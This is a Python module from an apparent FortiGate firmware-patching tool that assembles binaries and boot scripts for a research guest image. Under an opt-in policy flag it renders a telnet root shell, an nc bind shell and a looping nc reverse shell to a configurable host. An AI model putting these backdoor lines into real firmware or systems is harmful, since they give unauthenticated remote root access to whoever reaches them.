"""Verified access to packaged binaries and rendered guest scripts."""

from __future__ import annotations

from dataclasses import dataclass
from importlib import resources

from fortigate_patcher.domain.environment import EnvironmentIdentity
from fortigate_patcher.domain.errors import FirmwareError
from fortigate_patcher.domain.policy import BuildPolicy

from .hashing import sha256_bytes

BINARY_PACKAGE = "fortigate_patcher.resources.binaries"
GUEST_PACKAGE = "fortigate_patcher.resources.guest"

BINARY_SHA256 = {
    "busybox": "6e123e7f3202a8c1e9b1f94d8941580a25135382b99e8d3e34fb858bba311348",
    "dropbearmulti": "3694a76d5a4ecc7fb67e277342a5385be480b282c6389ecdabf8f6e26264f7e2",
    "gdb-runtime.tar.xz": ("b706f527a529963aef42da46932d97b9189c41c2565b56804718783d70fd0b45"),
}


@dataclass(frozen=True, slots=True)
class ResourceAsset:
    """One regular file injected into the guest's /bin archive."""

    data: bytes
    mode: int


def read_binary(name: str) -> bytes:
    """Read a pinned packaged binary and require its recorded SHA-256."""
    try:
        expected = BINARY_SHA256[name]
    except KeyError as exc:
        raise FirmwareError(f"unknown packaged binary resource: {name}") from exc
    data = resources.files(BINARY_PACKAGE).joinpath(name).read_bytes()
    actual = sha256_bytes(data)
    if actual != expected:
        raise FirmwareError(
            f"packaged binary fingerprint mismatch for {name}: {actual} != {expected}"
        )
    return data


def read_guest_script(name: str) -> bytes:
    """Read a packaged BusyBox guest script."""
    resource = resources.files(GUEST_PACKAGE).joinpath(name)
    try:
        data = resource.read_bytes()
    except OSError as exc:
        raise FirmwareError(f"cannot read packaged guest script {name}: {exc}") from exc
    if not data.startswith(b"#!") or b"\0" in data:
        raise FirmwareError(f"invalid packaged guest script: {name}")
    return data


def _render_persist(policy: BuildPolicy, environment: EnvironmentIdentity) -> bytes:
    template = read_guest_script("persist.sh").decode("ascii")
    network = "# DHCP disabled by policy."
    if policy.network.dhcp:
        interface = policy.network.interface
        if interface == "auto":
            candidates = "/sys/class/net/*"
        else:
            candidates = f"/sys/class/net/{interface}"
        network = f"""network_ready=0
network_attempts=0
network_stable_checks=0
network_interface=
network_has_lease() {{
    lease_ip=$("$bb" cat "$lease_file" 2>/dev/null)
    current_addresses=$("$bb" ip -4 -o addr show dev "$network_interface" 2>/dev/null)
    [ -n "$lease_ip" ] &&
        "$bb" printf '%s\\n' "$current_addresses" | "$bb" grep -Fq " $lease_ip/"
}}
network_acquire_lease() {{
    if "$bb" udhcpc -q -n -t 3 -T 1 -s /bin/udhcpc.sh \\
        -i "$network_interface" >/dev/ttyS0 2>&1; then
        lease_ip=$("$bb" cat "$lease_file" 2>/dev/null)
        "$bb" printf 'FGT_PATCHER_DHCP interface=%s ip=%s\\n' \\
            "$network_interface" "$lease_ip" >/dev/ttyS0 2>/dev/null
        return 0
    fi
    return 1
}}
while [ "$network_attempts" -lt 180 ]; do
    if [ -z "$network_interface" ]; then
        for candidate_path in {candidates}; do
            [ -e "$candidate_path" ] || continue
            network_interface=${{candidate_path##*/}}
            [ "$network_interface" = lo ] && {{ network_interface=; continue; }}
            network_type=$("$bb" cat "$candidate_path/type" 2>/dev/null)
            network_state=$("$bb" cat "$candidate_path/operstate" 2>/dev/null)
            [ "$network_type" = 1 ] || {{ network_interface=; continue; }}
            [ "$network_state" = up ] || {{ network_interface=; continue; }}
            break
        done
    fi
    if [ -n "$network_interface" ]; then
        lease_file=/tmp/fortigate-patcher-dhcp.${{network_interface}}.lease
        if network_has_lease; then
            network_stable_checks=$((network_stable_checks + 1))
        else
            network_stable_checks=0
            network_acquire_lease || true
        fi
        if [ "$network_stable_checks" -ge 10 ]; then
            network_ready=1
            "$bb" printf 'FGT_PATCHER_DHCP interface=%s\\n' "$network_interface" \\
                >/dev/ttyS0 2>/dev/null
            "$bb" printf 'FGT_PATCHER_DHCP_STABLE interface=%s ip=%s\\n' \\
                "$network_interface" "$lease_ip" >/dev/ttyS0 2>/dev/null
        fi
    fi
    [ "$network_ready" = 1 ] && break
    network_attempts=$((network_attempts + 1))
    "$bb" sleep 2
done
[ "$network_ready" = 1 ] || \\
    "$bb" printf 'FGT_PATCHER_DHCP_FAILED\\n' >/dev/ttyS0 2>/dev/null
if [ "$network_ready" = 1 ]; then
    (
        while :; do
            if ! network_has_lease && network_acquire_lease; then
                "$bb" printf 'FGT_PATCHER_DHCP_RESTORED interface=%s ip=%s\\n' \\
                    "$network_interface" "$lease_ip" >/dev/ttyS0 2>/dev/null
            fi
            "$bb" sleep 2
        done
    ) &
    network_watchdog_pid=$!
    "$bb" printf 'FGT_PATCHER_DHCP_WATCHDOG interface=%s pid=%s\\n' \\
        "$network_interface" "$network_watchdog_pid" >/dev/ttyS0 2>/dev/null
fi"""

    unsafe_lines = ["# Unsafe services disabled by policy."]
    unsafe = policy.unsafe
    if unsafe.enabled:
        unsafe_lines = ["# Explicitly enabled legacy research listeners."]
        if unsafe.telnet_shell:
            unsafe_lines.append(
                f'"$bb" telnetd -l /bin/rootshell -p {unsafe.telnet_port} >/dev/null 2>&1 &'
            )
        if unsafe.bind_shell:
            unsafe_lines.append(
                f'"$bb" nc -lk -p {unsafe.bind_port} -e /bin/rootshell >/dev/null 2>&1 &'
            )
        if unsafe.reverse_shell:
            unsafe_lines.append(
                "( while :; do "
                f'"$bb" nc -w 5 {unsafe.reverse_host} {unsafe.reverse_port} '
                '-e /bin/rootshell 2>/dev/null; "$bb" sleep 10; done ) '
                ">/dev/null 2>&1 &"
            )
    substitutions = {
        "@@NETWORK_SETUP@@": network,
        "@@SSH_ENABLED@@": "1" if policy.ssh.enabled else "0",
        "@@SSH_PORT@@": str(policy.ssh.port),
        "@@UNSAFE_SERVICES@@": "\n".join(unsafe_lines),
        "@@ENVIRONMENT_ID@@": environment.environment_id,
    }
    for marker, value in substitutions.items():
        template = template.replace(marker, value)
    if "@@" in template:
        raise FirmwareError("guest bootstrap contains an unresolved template marker")
    return template.encode("ascii")


def build_payload_assets(
    policy: BuildPolicy, environment: EnvironmentIdentity
) -> dict[str, ResourceAsset]:
    """Render the complete policy-controlled /bin payload."""
    environment.validate()
    assets = {
        "busybox": ResourceAsset(read_binary("busybox"), 0o755),
        "wini": ResourceAsset(read_guest_script("wini.sh"), 0o755),
        "persist.sh": ResourceAsset(_render_persist(policy, environment), 0o755),
        "rootshell": ResourceAsset(read_guest_script("rootshell.sh"), 0o755),
        "diag": ResourceAsset(read_guest_script("diag.sh"), 0o755),
        "authorized_keys": ResourceAsset(environment.client_public_key.strip() + b"\n", 0o600),
    }
    if policy.ssh.enabled:
        assets["dropbearmulti"] = ResourceAsset(read_binary("dropbearmulti"), 0o755)
    if policy.network.dhcp:
        assets["udhcpc.sh"] = ResourceAsset(read_guest_script("udhcpc.sh"), 0o755)
    wrapper = read_guest_script("gdb-wrapper.sh")
    if policy.debug.gdb:
        assets["gdb"] = ResourceAsset(wrapper, 0o755)
    if policy.debug.gdbserver:
        assets["gdbserver"] = ResourceAsset(wrapper, 0o755)
    return assets
